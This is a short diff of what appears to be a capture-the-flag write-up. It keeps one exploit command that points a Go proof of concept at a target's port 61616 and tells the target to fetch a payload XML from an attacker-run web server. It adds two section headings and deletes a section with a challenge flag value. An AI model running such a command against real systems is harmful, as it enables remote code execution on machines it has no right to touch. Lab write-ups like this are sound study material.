@@ -40,8 +40,6 @@ modify poc-linux.xml
 
 go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.8:8080/poc-linux.xml
 
+Privilege Escalation. 
+Nginx Exploitation.
 
-
-Flag
-
-07062250f4fdfc26afd21243a2bdf852
